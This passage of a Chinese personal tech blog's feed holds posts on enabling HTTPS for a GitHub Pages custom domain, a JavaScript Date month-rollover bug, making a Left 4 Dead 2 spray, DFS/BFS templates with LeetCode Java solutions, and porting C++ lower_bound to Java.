class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig sumygg.com +noall +answer</span></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; sumygg.com +noall +answer</span><br><span class="line">;; global options: +cmd</span><br><span class="line">sumygg.com. 6332 IN A 185.199.111.153</span><br><span class="line">sumygg.com. 6332 IN A 185.199.110.153</span><br><span class="line">sumygg.com. 6332 IN A 185.199.108.153</span><br><span class="line">sumygg.com. 6332 IN A 185.199.109.153</span><br></pre></td></tr></table></figure><p>但还是无法选中 <strong>Enforce HTTPS</strong> ，无奈之下用蹩脚的英语给Github Staff发了邮件，最后Staff大大帮忙解决了问题。</p><blockquote><p>Hey there,</p><p>Thanks for reaching out! I just gave your certificate a nudge and you should be all set now.</p><p>Best,<br />Shawna</p></blockquote><p>可喜可贺，可喜可贺。</p><img src="/2018/05/28/custom-domains-on-github-pages-support-for-https/3.png" class="" title="小绿锁"><h1 id="检查网站内容"><a class="markdownIt-Anchor" href="#检查网站内容"></a> 检查网站内容</h1><p>接下来要做的事情是让网站默认跳转到HTTPS，这里从网上 <em>借鉴</em> 了一段代码代码就可以搞定了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if theme.forcehttps &#x3D;&#x3D; true</span><br><span class="line">  script.</span><br><span class="line">    (function (root) &#123;</span><br><span class="line">      &quot;use strict&quot;;</span><br><span class="line">      var h &#x3D; root ? root.location.hostname : &quot;&quot;,</span><br><span class="line">      p &#x3D; root ? root.location.protocol : &quot;&quot;;</span><br><span class="line">      if (&quot;http:&quot; &#x3D;&#x3D;&#x3D; p &amp;&amp; !(&#x2F;^(localhost|127.0.0.1)&#x2F;).test(h)) &#123;</span><br><span class="line">        root.location.protocol &#x3D; &quot;https:&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)(&quot;undefined&quot; !&#x3D;&#x3D; typeof window ? window : this);</span><br></pre></td></tr></table></figure><p>由于HTTPS访问中不允许出现http和https链接混用的情况，需要检查你网站中的链接，想办法将http升级到https。</p><p>其它的以后再说吧，我先去嘚瑟一下了。<img class="emoji" draggable="false" alt="😎" src="https://twemoji.maxcdn.com/2/72x72/1f60e.png"/></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近&lt;a href=&quot;https://blog.github.com/2018-05-01-github-pages-custom-domains-https/&quot;&gt;Github官方博客&lt;/a&gt;上已经宣布自定义域名也支持通过HTTPS进行访问。之前也没想过要弄个HTTPS，借</summary>
      
    
    
    
    <category term="网站" scheme="https://sumygg.com/categories/%E7%BD%91%E7%AB%99/"/>
    
    
    <category term="github" scheme="https://sumygg.com/tags/github/"/>
    
    <category term="https" scheme="https://sumygg.com/tags/https/"/>
    
    <category term="域名" scheme="https://sumygg.com/tags/%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>一个处理JavaScript日期的时候出现的问题</title>
    <link href="https://sumygg.com/2018/05/21/a-plus-one-day-problem-in-javascript/"/>
    <id>https://sumygg.com/2018/05/21/a-plus-one-day-problem-in-javascript/</id>
    <published>2018-05-21T12:29:53.000Z</published>
    <updated>2021-03-16T08:51:03.053Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写博客了，有半年之久了吧。今天就之前遇到的一个bug聊一聊在用JavaScript处理日期的时候出现的一个问题。</p><p>代码需要获取startDate和endDate之间的所有间隔的天数，传入的日期格式为 <code>YYYY-MM-DD</code> 。代码的逻辑很明朗，设置开始时间，给开始时间增加天数，与结束时间相比较，直到多于结束时间为止。当时的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成日期列表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDateList</span>(<span class="params">startDate, endDate</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> datas = [];</span><br><span class="line">    <span class="keyword">if</span> (startDate == endDate) &#123;</span><br><span class="line">        <span class="keyword">var</span> date = &#123;&#125;;</span><br><span class="line">        date.dataDate = getDate(startDate);</span><br><span class="line">        datas.push(date);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//计算出设置的开始时间</span></span><br><span class="line">        <span class="keyword">var</span> myDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        myDate.setFullYear(startDate.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line">        myDate.setMonth(startDate.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>] - <span class="number">1</span>);</span><br><span class="line">        myDate.setDate(startDate.split(<span class="string">&quot;-&quot;</span>)[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加第一天</span></span><br><span class="line">        <span class="keyword">var</span> sd = getDate(startDate); <span class="comment">//开始时间转换成yyyyMMdd格式</span></span><br><span class="line">        <span class="keyword">var</span> ed = getDate(endDate); <span class="comment">//结束时间转换成yyyyMMdd格式</span></span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (sd &lt;= ed) &#123; <span class="comment">//当循环到时间大于结束时间，则退出循环</span></span><br><span class="line">            <span class="comment">//从开始时间没循环一次增加一天</span></span><br><span class="line">            <span class="keyword">var</span> date = &#123;&#125;;</span><br><span class="line">            date.dataDate = sd;</span><br><span class="line">            datas.push(date);</span><br><span class="line">            i++;</span><br><span class="line">            sd = getDate(addDate(myDate, i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> datas;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看似乎没什么问题，但是就在今年的1月31日的时候，有人反馈，该代码的功能无法使用，获取的时间列表不正确，并提供了100%复现的方法。就这样开始了纠结的debug之旅。</p><p>奇怪的地方有三点：</p><ol><li>触发时间。之前一直正常，偏偏31号的时候使用不正常。</li><li>bug行为。表现是获取的时间列表只出现一个值。</li><li>凑数用的第三点（忽略掉。。。</li></ol><p>最后，还是通过Console的单步Debug找到的问题的所在。原来在修改日期的时候，分别赋值了年、月、日。由于修改不是一次完成，期间就会出现非法日期，浏览器会修正这个非法日期。</p><p>以今天为2018年1月31日，设置“2017-11-11”为例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myDate = <span class="keyword">new</span> <span class="built_in">Date</span>(); <span class="comment">// 2018-1-31</span></span><br><span class="line">myDate.setFullYear(startDate.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>]); <span class="comment">// 2017-1-31</span></span><br><span class="line">myDate.setMonth(startDate.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>] - <span class="number">1</span>); <span class="comment">// 2017-11-31 日期非法，修正到一个相邻的日期 2017-12-1</span></span><br><span class="line">myDate.setDate(startDate.split(<span class="string">&quot;-&quot;</span>)[<span class="number">2</span>]); <span class="comment">// 2017-12-11</span></span><br></pre></td></tr></table></figure><p>我写了一个jsfiddle小片段，可以用来单步调试一下上述问题的过程。</p><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/p9u16zfg/embedded/html,js,result/light" frameborder="0" loading="lazy" allowfullscreen></iframe><p>解决方案也很简单，只要保证年月日一次赋值进去就可以了，最好直接的方法就是在构造函数里指定要赋值的年月日 <code>new Date(2017, 11, 11)</code> 。</p><p>就这样又消灭了一个bug，世界再次和平了。。。<img class="emoji" draggable="false" alt="😸" src="https://twemoji.maxcdn.com/2/72x72/1f638.png"/></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没写博客了，有半年之久了吧。今天就之前遇到的一个bug聊一聊在用JavaScript处理日期的时候出现的一个问题。&lt;/p&gt;
&lt;p&gt;代码需要获取startDate和endDate之间的所有间隔的天数，传入的日期格式为 &lt;code&gt;YYYY-MM-DD&lt;/code&gt; 。代码</summary>
      
    
    
    
    <category term="问题麻烦" scheme="https://sumygg.com/categories/%E9%97%AE%E9%A2%98%E9%BA%BB%E7%83%A6/"/>
    
    
    <category term="javascript" scheme="https://sumygg.com/tags/javascript/"/>
    
    <category term="日期时间" scheme="https://sumygg.com/tags/%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/"/>
    
  </entry>
  
  <entry>
    <title>制作《求生之路2》喷漆</title>
    <link href="https://sumygg.com/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/"/>
    <id>https://sumygg.com/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/</id>
    <published>2017-09-23T07:37:59.000Z</published>
    <updated>2021-03-16T08:51:03.007Z</updated>
    
    <content type="html"><![CDATA[<p>最近比较迷《求生之路2》，不过现在的水平也只能打打普通难度。网上有许多个人的服务器，可以支持多于4人的游戏。游戏人多了就感觉比较有意思了。过程中看到好多人都会往墙上或地上画一些个性的图画（或者不可描述的图片），感觉比较有意思。查了查发现制作喷漆也很简单，于是打算动手制作一个。<img class="emoji" draggable="false" alt="😋" src="https://twemoji.maxcdn.com/2/72x72/1f60b.png"/></p><h1 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h1><p>已知喷漆的类型有几种：普通贴图喷漆、距离变换喷漆、动图喷漆。喷漆的原理其实只是一帧一帧的图片轮番显示而已。想做一个动图的喷漆。</p><p>需要的工具：</p><ol><li>vtfedit-主要用来编辑和生成喷漆文件</li><li>ScreenToGif-集屏幕录制和gif编辑于一身的工具</li></ol><h1 id="制作"><a class="markdownIt-Anchor" href="#制作"></a> 制作</h1><h2 id="来源图片"><a class="markdownIt-Anchor" href="#来源图片"></a> 来源图片</h2><p>喷漆选用的图片当然是最最可爱的日富美了<img class="emoji" draggable="false" alt="😍" src="https://twemoji.maxcdn.com/2/72x72/1f60d.png"/>，选用了《NEW GAME！！》op中的一段，“轻柔如羽毛”。。。</p><img src="/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/rifumei.gif" class="" title="轻柔如羽毛"><p>这个gif使用ScreenToGif录制。为了缩小体积，修改了图片的大小，只截取了中间正方形的部分。还有删去了几帧，这样的感觉似乎有点鬼畜，不过在游戏中似乎无所谓。</p><img src="/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/3.gif" class="" title="轻柔如羽毛"><p>接下来继续使用ScreenToGif将gif的每一帧导成一张图片。这样整个gif就变成了相册集了。</p><p>看着有点晃眼<img class="emoji" draggable="false" alt="😖" src="https://twemoji.maxcdn.com/2/72x72/1f616.png"/>，快点继续。。。</p><h2 id="制作喷漆"><a class="markdownIt-Anchor" href="#制作喷漆"></a> 制作喷漆</h2><p>按帧导出图片之后，要用vtfedit工具制作喷漆。</p><img src="/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/2.png" class="" title="按帧导出图片"><p>打开VTFEdit软件，选择File-&gt;Import…，按住Shitf或Ctrl选择导出图片的所有帧。选择后出现VTF Options对话框。</p><img src="/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/3.png" class="" title="图片导入选项"><p>导入选项其余的没有要修改的，需要注意调整Clamp大小，为了减少文件体积，这里选择64x64大小的。可以多制作几个选择不同大小测试一下，文件体积尽量保持在100kb左右吧。</p><img src="/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/4.png" class="" title="导入后"><p>导入后点击Play就能播放，播放感觉速度会很快，但是游戏中的速度没有这么快。还有大小也没有看到的这么小，游戏中就感觉很大的样子了。</p><p>最后通过File-&gt;Save…保存成vtf喷漆文件。</p><h2 id="导入喷漆"><a class="markdownIt-Anchor" href="#导入喷漆"></a> 导入喷漆</h2><p>打开游戏，在主界面选择“选项”-&gt;“多人联机”，下面有个“导入喷漆图案…”的菜单。由于游戏对中文支持不够好，喷漆需要放在全英文路径下，文件名也是英文字符即可。</p><p>导入喷漆后就可以在游戏中使用了。喷漆的快捷键默认是T。</p><p>游戏中的效果大概是这样子，感觉还不错。</p><img src="/2017/09/23/make-left4dead2-spray-paint-from-new-game-op/5.png" class="" title="效果图">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近比较迷《求生之路2》，不过现在的水平也只能打打普通难度。网上有许多个人的服务器，可以支持多于4人的游戏。游戏人多了就感觉比较有意思了。过程中看到好多人都会往墙上或地上画一些个性的图画（或者不可描述的图片），感觉比较有意思。查了查发现制作喷漆也很简单，于是打算动手制作一个</summary>
      
    
    
    
    <category term="游戏人生" scheme="https://sumygg.com/categories/%E6%B8%B8%E6%88%8F%E4%BA%BA%E7%94%9F/"/>
    
    
    <category term="游戏" scheme="https://sumygg.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
    <category term="求生之路2" scheme="https://sumygg.com/tags/%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF2/"/>
    
    <category term="喷漆" scheme="https://sumygg.com/tags/%E5%96%B7%E6%BC%86/"/>
    
    <category term="newgame" scheme="https://sumygg.com/tags/newgame/"/>
    
    <category term="日富美" scheme="https://sumygg.com/tags/%E6%97%A5%E5%AF%8C%E7%BE%8E/"/>
    
  </entry>
  
  <entry>
    <title>深搜&amp;广搜一二三</title>
    <link href="https://sumygg.com/2017/09/11/breadth-first-search-and-depth-first-search-one-two-three/"/>
    <id>https://sumygg.com/2017/09/11/breadth-first-search-and-depth-first-search-one-two-three/</id>
    <published>2017-09-11T08:12:22.000Z</published>
    <updated>2021-03-16T08:51:03.007Z</updated>
    
    <content type="html"><![CDATA[<p>搜索是一种求解的方法，通常来说就是将所有情况探索一遍，找出其中符合要求的情况作为最后的解。按照生成解的顺序有两种基本的求解顺序：<strong>深度优先搜索（Depth-first Search）</strong> 和 <strong>广度优先搜索（Breadth-first search）</strong>。关于这两种搜索方式的基本原理不做过多介绍了，下面只说明个人对这两种搜索方式的一些理解。</p><h1 id="深度优先搜索"><a class="markdownIt-Anchor" href="#深度优先搜索"></a> 深度优先搜索</h1><p>深度优先搜索俗称dfs，核心实现方式是依附于递归。适用于需要求解出所有可能解的问题，在到达问题界限之前会一直递归下去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dfs() &#123;</span><br><span class="line">  if(到达目标递归深度) &#123;</span><br><span class="line">    判断当前状态是否为解？-&gt;添加当前状态到解集合</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  for(i in 所有可能情况) &#123;</span><br><span class="line">    if(i还未进行搜索) &#123;</span><br><span class="line">      标记i已搜索</span><br><span class="line">      dfs()</span><br><span class="line">      还原现场（标记i未搜索）</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以<a href="https://leetcode.com/problems/permutations/description/">LeetCode Q46 Permutations</a>例子为例，该题目要求输出一组数字的全排列：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; ans, List&lt;Integer&gt; tmp, <span class="keyword">int</span>[] nums, <span class="keyword">boolean</span>[] visited, <span class="keyword">int</span> cnt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cnt == nums.length) &#123;                       <span class="comment">// 已遍历的数字个数 等于 所有数字的个数</span></span><br><span class="line">        ans.add(<span class="keyword">new</span> ArrayList&lt;&gt;(tmp));              <span class="comment">// 保存当前解</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;         <span class="comment">// 遍历所有可能的情况</span></span><br><span class="line">        <span class="keyword">if</span> (!visited[i]) &#123;                          <span class="comment">// 该情况未被访问</span></span><br><span class="line">            visited[i] = <span class="keyword">true</span>;                      <span class="comment">// 标记</span></span><br><span class="line">            tmp.add(nums[i]);</span><br><span class="line">            dfs(ans, tmp, nums, visited, cnt + <span class="number">1</span>);  <span class="comment">// 递归</span></span><br><span class="line">            tmp.remove(tmp.size() - <span class="number">1</span>);             <span class="comment">// 还原</span></span><br><span class="line">            visited[i] = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要保存的状态有：ans（存储所有的排列）、tmp（到达当前位置遍历过的数字）、nums（数字数组）、visited（数字是否遍历过，防止在一条路径中相同数字遍历多次），cnt（当前遍历了多少数字了）。</p><p>依靠于递归的深搜大体结构是不会变化的。需要注意的点有：参数记录的状态、过滤掉不可能的状态、状态的保存和还原。</p><h1 id="广度优先搜索"><a class="markdownIt-Anchor" href="#广度优先搜索"></a> 广度优先搜索</h1><p>广度优先搜索简称bfs，也是通常所说的层级遍历。bfs适用于那些最小或最短问题的求解。核心思想是通过队列或优先队列保存状态，优先选择看似最优的状态进行扩展，已达到最先扩展到目标节点的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bfs()&#123;</span><br><span class="line">  队列queue</span><br><span class="line">  queue.add(初始状态);</span><br><span class="line">  置初始状态访问</span><br><span class="line">  while(!queue.empty()) &#123;</span><br><span class="line">    当前状态 cur &#x3D; queue.poll();</span><br><span class="line">    处理当前状态（符合条件记录或返回）</span><br><span class="line"></span><br><span class="line">    for(cur的所有可能的下一个状态 --&gt; next) &#123;</span><br><span class="line">      if(next没有被访问)&#123;</span><br><span class="line">          queue.add(next);</span><br><span class="line">          置next访问</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>模板提供的是一种求解最近、最短解的思路。下面以<a href="https://leetcode.com/problems/binary-tree-level-order-traversal/description/">LeetCode Q102 Binary Tree Level Order Traversal</a>为例。该题要求按层次输出树的节点，同一层次的节点放到一个List中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNodeWrapper</span> </span>&#123;</span><br><span class="line">    TreeNode node;</span><br><span class="line">    <span class="keyword">int</span> level;</span><br><span class="line"></span><br><span class="line">    TreeNodeWrapper(TreeNode node, <span class="keyword">int</span> level) &#123;</span><br><span class="line">        <span class="keyword">this</span>.node = node;</span><br><span class="line">        <span class="keyword">this</span>.level = level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> ans;</span><br><span class="line">    Queue&lt;TreeNodeWrapper&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.add(<span class="keyword">new</span> TreeNodeWrapper(root, <span class="number">0</span>));  <span class="comment">// 置初始访问状态</span></span><br><span class="line">    List&lt;Integer&gt; levelNode = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (queue.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理当前节点</span></span><br><span class="line">        TreeNodeWrapper treenode = queue.poll();</span><br><span class="line">        <span class="keyword">if</span> (treenode.level != ans.size()) &#123;</span><br><span class="line">            ans.add(levelNode);</span><br><span class="line">            levelNode = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        levelNode.add(treenode.node.val);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将当前节点的所有子节点添加到队列中</span></span><br><span class="line">        <span class="keyword">if</span> (treenode.node.left != <span class="keyword">null</span>)</span><br><span class="line">            queue.add(<span class="keyword">new</span> TreeNodeWrapper(treenode.node.left, treenode.level + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">if</span> (treenode.node.right != <span class="keyword">null</span>)</span><br><span class="line">            queue.add(<span class="keyword">new</span> TreeNodeWrapper(treenode.node.right, treenode.level + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ans.add(levelNode);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bfs主要思路是对下一个状态的选取和状态的遍历，在遍历树的时候，节点会按照层次以此添加到队列中，在处理完一层之后，下一层也自然而然的添加到了队列中。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>深度优先搜索和广度优先搜索只是最基本的搜索方式，有句话说，通过搜索可以解决所有的问题。当然在一些解空间很大的问题上，搜索会耗费很多的时间来遍历所有的情况。</p><p>为了减少搜索遍历的不必要的路径，出现了很多剪枝或者叫变种方式，通过一些手段尽可能的减少解空间。这些留到以后再慢慢去了解吧。</p><p>终于，又水完了一篇博客，开心<img class="emoji" draggable="false" alt="😂" src="https://twemoji.maxcdn.com/2/72x72/1f602.png"/>。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;搜索是一种求解的方法，通常来说就是将所有情况探索一遍，找出其中符合要求的情况作为最后的解。按照生成解的顺序有两种基本的求解顺序：&lt;strong&gt;深度优先搜索（Depth-first Search）&lt;/strong&gt; 和 &lt;strong&gt;广度优先搜索（Breadth-firs</summary>
      
    
    
    
    <category term="算法" scheme="https://sumygg.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="深搜" scheme="https://sumygg.com/tags/%E6%B7%B1%E6%90%9C/"/>
    
    <category term="广搜" scheme="https://sumygg.com/tags/%E5%B9%BF%E6%90%9C/"/>
    
  </entry>
  
  <entry>
    <title>用Java实现C++::std中的upper_bound和lower_bound</title>
    <link href="https://sumygg.com/2017/09/08/upper-bound-and-lower-bound-in-java/"/>
    <id>https://sumygg.com/2017/09/08/upper-bound-and-lower-bound-in-java/</id>
    <published>2017-09-08T08:30:18.000Z</published>
    <updated>2021-03-16T08:51:03.007Z</updated>
    
    <content type="html"><![CDATA[<p>Cpp的Std标准库中包含了很多算法，以前写Cpp的时候受益于Std库，确实方便了不少，在Java语言下还是要慢慢适应Java语言的方式。</p><p>Java没有迭代器指针这个概念，所以很多内容与C++有所不同。Java中有二分的实现，叫做<code>java.util.Arrays.binarySearch()</code>。使用二分的前提是数组必须有序（从小到大）。如果没有排序，那么方法无法确定返回哪个值。对于有序的数组，如果数组中包含多个相同的目标值，方法也无法保证找到的是哪一个。若找到了目标值，方法会返回目标值所在的下标；如果没有找到目标值，则方法会返回一个可以插入该值的位置，以负数表示 <em>-(<em>插入点</em> - 1)</em> 。</p><p>C++中也有相应的二分查找函数 <code>std::binary_search</code> 不过该函数返回一个 <code>bool</code> 型表示有没有找到目标值。相对于二分查找，还是更倾向于使用 <code>std::lower_bound</code> 和 <code>std::upper_boudn</code> 函数。</p><h1 id="lower_bound"><a class="markdownIt-Anchor" href="#lower_bound"></a> lower_bound</h1><p><code>lower_bound</code>是找到第一个<strong>大于等于</strong>value的位置，比如 <code>[1, 2, 3, 3, 3, 4, 7, 8]</code> 查找 <code>3</code> 会返回下标为2的位置，查找 <code>6</code> 会返回下标为6的位置。如果未找到则返回数组的长度（C++中会返回end()迭代器的位置）。</p><p>首先来看std中的一个实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">template&lt;class ForwardIt, class T&gt; ForwardIt lower_bound(ForwardIt first, ForwardIt last, const T&amp; value)</span><br><span class="line">&#123;</span><br><span class="line">    ForwardIt it;</span><br><span class="line">    <span class="keyword">typename</span> <span class="built_in">std</span>::iterator_traits&lt;ForwardIt&gt;::difference_type count, step;</span><br><span class="line">    count = <span class="built_in">std</span>::distance(first, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        it = first;</span><br><span class="line">        step = count / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">std</span>::advance(it, step);</span><br><span class="line">        <span class="keyword">if</span> (*it &lt; value) &#123;</span><br><span class="line">            first = ++it;</span><br><span class="line">            count -= step + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count = step;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们照葫芦画瓢，写一个Java的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count, step, it;</span><br><span class="line">    count = end - begin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        it = begin;</span><br><span class="line">        step = count / <span class="number">2</span>;</span><br><span class="line">        it += step;</span><br><span class="line">        <span class="keyword">if</span> (nums[it] &lt; value) &#123;</span><br><span class="line">            begin = ++it;</span><br><span class="line">            count -= step + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = step;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> begin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于不确定迭代器是不是随机访问迭代器，C++实现比较保守的使用了 <code>开始位置</code> 和 <code>区间长度</code> 作为二分的指标。不过Java弱化了迭代器的概念，所以可以将数组的版本精简如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 